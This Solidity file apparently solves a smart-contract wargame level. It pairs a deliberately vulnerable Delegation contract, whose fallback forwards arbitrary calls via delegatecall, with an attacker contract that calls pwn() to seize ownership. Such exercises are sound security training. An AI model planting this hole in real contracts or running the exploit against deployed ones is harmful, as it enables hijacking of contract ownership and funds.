// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    uint256 public count;

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        count++;
        if (result) {
            this;
        }
    }
}

contract DelAttack {
    Delegation x;

    constructor(address _delegationAddress) {
        x = Delegation(_delegationAddress);
    }

    bytes4 public sel = bytes4(abi.encodeWithSignature("pwn()"));

    function attack() external {
        (bool succ, ) = address(x).call(abi.encodeWithSignature("pwn()"));
        require(succ, "Call failed");
    }
}
